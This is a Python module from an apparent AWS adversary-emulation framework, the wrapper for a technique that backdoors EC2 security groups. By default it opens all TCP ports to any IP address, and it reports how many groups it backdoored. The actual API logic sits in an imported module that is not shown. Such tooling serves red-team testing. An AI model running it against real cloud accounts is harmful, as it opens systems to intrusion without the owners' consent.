#!/usr/bin/env python3
#'description': ''This module adds rules to backdoor EC2 security groups. It attempts to open ingress port ranges from an IP of your choice.',
import datetime

import argparse
from botocore.exceptions import ClientError
import importlib


target = ''

technique_info = {
    'blackbot_id': 'T1562.007',
    'external_id': '',
    'controller': 'ec2_backdoor_enum_sec_groups',
    'services': ['EC2'],
    'prerequisite_modules': ['ec2_enum_securitygroups'],
    'arguments_to_autocomplete': ['--ip', '--port-range', '--protocol', '--groups'],
    'version': '1',
    'aws_namespaces': [],
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'ttp_exec': '',
    'ttp_mitigation': '',
    'ttp_detection': '',
    'intent': 'Adds backdoor rules to EC2 security groups.',
    'name': 'ADD_NAME_HERE' ,
}

parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])

parser.add_argument('--ip', required=False, default='0.0.0.0/0', help='The IP address or CIDR range to allow access to (ex: 127.0.0.1/24). The default is to allow access from any IP address (0.0.0.0/0).')
parser.add_argument('--port-range', required=False, default='1-65535', help='The port range to open for each EC2 security group in the format start-end (ex: 1-455). The default range is every port (1-65535).')
parser.add_argument('--protocol', required=False, default='tcp', help='The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress')
parser.add_argument('--groups', required=False, default=None, help='The EC2 security groups to backdoor in the format of a comma separated list of name@region. If omitted, all security groups will be backdoored.')


def main(args, awsattack_main):
    args = parser.parse_args(args)

    import_path = 'ttp.src.ec2_backdoor_enum_sec_groups_src'
    src_code = __import__(import_path, globals(), locals(), ['technique_info'], 0)
    importlib.reload(src_code)

    awsattack_main.chain = True
    return src_code.main(args, awsattack_main)

def summary(data, awsattack_main):
    out = ''
    if 'BackdooredCount' in data:
        out += '  {} security group(s) successfully backdoored.\n'.format(data['BackdooredCount'])
    return out
